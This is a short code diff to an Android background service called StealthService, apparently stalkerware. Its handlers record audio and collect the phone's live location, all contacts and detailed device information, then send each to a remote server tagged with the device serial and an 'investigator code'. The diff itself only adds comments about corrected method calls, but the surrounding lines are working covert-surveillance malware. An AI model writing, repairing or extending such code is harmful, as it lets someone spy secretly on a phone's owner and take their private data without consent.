@@ -217,7 +217,7 @@ public class StealthService extends Service {
         }
     }
 
-    // Command implementations
+    // Command implementations - FIXED METHOD CALLS
     private void startAudioRecording() {
         try {
             if (audioRecorder != null) {
@@ -278,6 +278,7 @@ public class StealthService extends Service {
     private void getLiveLocation() {
         try {
             if (locationTracker != null) {
+                // Use the method without parameters
                 JSONObject location = locationTracker.getCurrentLocation();
                 sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "live_location", location);
             }
@@ -289,6 +290,7 @@ public class StealthService extends Service {
     private void getAllContacts() {
         try {
             if (contactGrabber != null) {
+                // Use the correct method name
                 JSONObject contacts = contactGrabber.extractContacts();
                 sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "all_contacts", contacts);
             }
@@ -323,6 +325,7 @@ public class StealthService extends Service {
     private void getDetailedDeviceInfo() {
         try {
             if (deviceInfoCollector != null) {
+                // Use the method without parameters
                 JSONObject deviceInfo = deviceInfoCollector.collectDeviceInfo();
                 sendToServer(Build.SERIAL, prefs.getString("investigator_code", ""), "detailed_device_info", deviceInfo);
             }
